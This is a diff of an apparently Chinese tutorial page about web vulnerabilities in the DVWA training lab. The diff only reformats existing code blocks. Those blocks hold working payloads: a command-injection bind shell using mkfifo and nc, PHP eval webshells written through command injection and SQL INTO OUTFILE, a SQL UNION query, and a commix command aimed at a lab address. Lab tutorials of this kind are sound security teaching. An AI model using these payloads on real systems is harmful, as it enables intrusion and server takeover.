@@ -581,17 +581,15 @@
 <li>利用姿势:</li>
 </ul>
 <ol>
-<li>反弹shell</li>
+<li><p>反弹shell</p>
+<p><code>1;mkfifo /tmp/e;sh /tmp/e | nc -nlp 2333 &gt; /tmp/e</code></p>
+</li>
+<li><p>写入webshell<br><code>1;echo &#39;&lt;?php eval($_POST[&quot;c&quot;]);?&gt;&#39; &gt; ws.php</code></p>
+</li>
+<li><p>利用commix自动测试</p>
+<p><code>python commix.py --url=&quot;http://172.17.205.232:89/vulnerabilities/exec/#&quot; --data=&quot;ip=INJECT_HERE&amp;submit=submit&quot;  --cookie=&quot;PHPSESSID=sh36ods5unj4lqfuuojohp0o44;security=low&quot;</code></p>
+</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1;mkfifo /tmp/e;sh /tmp/e | nc -nlp 2333 &gt; /tmp/e</div></pre></td></tr></table></figure>
-<ol>
-<li>写入webshell</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1;echo &apos;&lt;?php eval($_POST[&quot;c&quot;]);?&gt;&apos; &gt; ws.php</div></pre></td></tr></table></figure>
-<ol>
-<li>利用commix自动测试</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python commix.py --url=&quot;http://172.17.205.232:89/vulnerabilities/exec/#&quot; --data=&quot;ip=INJECT_HERE&amp;submit=submit&quot;  --cookie=&quot;PHPSESSID=sh36ods5unj4lqfuuojohp0o44;security=low&quot;</div></pre></td></tr></table></figure>
 <h5 id="（二）-SQL注入漏洞"><a href="#（二）-SQL注入漏洞" class="headerlink" title="（二） SQL注入漏洞"></a>（二） SQL注入漏洞</h5><p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
 <ul>
 <li>示例代码</li>
@@ -601,15 +599,16 @@
 <li>利用姿势：</li>
 </ul>
 <ol>
-<li>查看信息</li>
+<li><p>查看信息</p>
+<p><code>&#39;union select user(),database() #</code></p>
+</li>
 </ol>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">'union <span class="keyword">select</span> <span class="keyword">user</span>(),<span class="keyword">database</span>() #</div></pre></td></tr></table></figure>
 <ol>
-<li>拿shell<br>需要知道绝对路径和写权限</li>
-</ol>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">'union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'&lt;?php eval($_POST[cmd]);?&gt;'</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'/var/www/dvwa/cmd.php'</span> #</div></pre></td></tr></table></figure>
-<ol>
-<li>使用sqlmap测试（略）</li>
+<li><p>拿shell(需要知道绝对路径和写权限)</p>
+<p><code>&#39;union select 1,&#39;&lt;?php eval($_POST[cmd]);?&gt;&#39; INTO OUTFILE &#39;/var/www/dvwa/cmd.php&#39; #</code></p>
+</li>
+<li><p>使用sqlmap测试（略）</p>
+</li>
 </ol>
 <h4 id="三、前端类"><a href="#三、前端类" class="headerlink" title="三、前端类"></a>三、前端类</h4><h4 id="（一）跨站脚本攻击漏洞"><a href="#（一）跨站脚本攻击漏洞" class="headerlink" title="（一）跨站脚本攻击漏洞"></a>（一）跨站脚本攻击漏洞</h4>
           
